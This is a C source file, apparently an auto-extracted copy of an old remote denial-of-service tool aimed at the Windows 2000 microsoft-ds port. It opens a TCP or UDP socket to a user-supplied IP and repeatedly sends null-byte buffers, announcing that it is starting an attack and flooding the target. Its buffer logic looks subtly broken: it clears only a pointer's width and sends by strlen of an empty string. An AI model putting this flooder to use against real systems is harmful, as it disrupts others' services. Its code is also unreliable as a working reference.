#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  target ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  nullbuffer ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  IPPROTO_UDP ; 
 unsigned short MICROSOFT_DS_PORT ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  SOCK_DGRAM ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  bzero (char*,int) ; 
 int /*<<< orphan*/  close (int) ; 
 scalar_t__ connect (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  htons (unsigned short) ; 
 scalar_t__ malloc (int) ; 
 int /*<<< orphan*/  memset (struct sockaddr_in*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  resolveTarget (char*) ; 
 scalar_t__ send (int,char*,scalar_t__,int /*<<< orphan*/ ) ; 
 scalar_t__ sendto (int,char*,scalar_t__,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 scalar_t__ strlen (char*) ; 

int main(int argc, char *argv[])
{
        int sock;
	int count;
	struct sockaddr_in target;
	unsigned short port = MICROSOFT_DS_PORT;
	char *nullbuffer;


	printf("%c[41m", 0x1B);
	fprintf(stdout, "\n--[ excE's Remote Microsoft Windows 2000 DoS (microsoft-ds)\n"); 
	printf("%c[0m", 0x1B);
	fprintf(stdout, "-----------------------------------------------------------\n");

        if(argc != 4)
        {
                fprintf(stderr, "--[ Invalid number of parameters!\n");
                fprintf(stderr, "--[ Usage: %s <Server IP> <TCP/UDP> <Send Count>\n", argv[0]);
                fprintf(stderr, "--[ Forex: %s 127.0.0.1 UDP 10000\n\n", argv[0]);
                exit(-1);
        }

	nullbuffer = (char *) malloc(10*1024*sizeof(char));
	bzero(nullbuffer,sizeof(nullbuffer));
	
	fprintf(stdout, "--[ Starting attack on %s...\n", argv[1]);

	memset(&target, 0, sizeof(target));
	target.sin_family 	= AF_INET;
	target.sin_addr.s_addr 	= resolveTarget(argv[1]);
	target.sin_port		= htons(port);


	if(argv[2][0] == 'U')
	{
		if((sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		{
			perror("socket() failed ");
			exit(-1);
		}
	
		fprintf(stdout, "--[ Sending NULL byte string * %d via UDP\n", atoi(argv[3]));

		for(count=0;count<atoi(argv[3]);count++)
		{
		    if(sendto(sock, nullbuffer, strlen(nullbuffer), 0, (struct sockaddr *) &target, sizeof(target)) != strlen(nullbuffer))
		    {
				perror("sendto() failed ");
				exit(-1);
		    } else { printf("."); } 
		}
		close(sock);
		printf("\n");
	}
	 else if(argv[2][0] == 'T')
	{
		
		fprintf(stdout, "--[ Connecting and sending NULL byte string * %d...\n", atoi(argv[3]));
		 
		if((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		{
			perror("socket() failed ");
			exit(-1);
		}

		if(connect(sock, (struct sockaddr *) &target, sizeof(target)) < 0)
		{
			perror("connect() failed ");
			exit(-1);
		}

		for(count=0;count<atoi(argv[3]);count++)
		{ 
			if(send(sock, nullbuffer, strlen(nullbuffer), 0) != strlen(nullbuffer))
			{
				perror("send() failed ");
				exit(-1);
			} else { printf("."); }

		}
		close(sock);
		printf("\n");
	} else
	{
		fprintf(stderr, "--[ Error: You must define a protocol (TCP or UDP)\n\n");
		exit(-1);
	}

	fprintf(stdout, "--[ Finished flooding target!\n");
	fprintf(stdout, "--[ http://www.telhack.tk\n");
	
	return 0;
}